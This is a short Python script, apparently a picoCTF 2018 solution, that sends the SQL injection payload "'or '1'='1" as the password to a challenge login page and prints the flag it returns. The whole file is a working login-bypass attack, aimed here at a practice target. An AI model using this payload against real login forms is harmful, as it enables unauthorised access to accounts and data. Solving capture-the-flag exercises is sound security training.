#!/usr/local/bin/python3

import requests
import re

url = 'http://2018shell1.picoctf.com:49030/login.php'

s = requests.session()

params = {"username": "admin", "password": "'or '1'='1", 'debug': '1'}

response = s.post(url, data=params)


print(re.findall('Your flag is: (.*)</p>', response.text)[0])
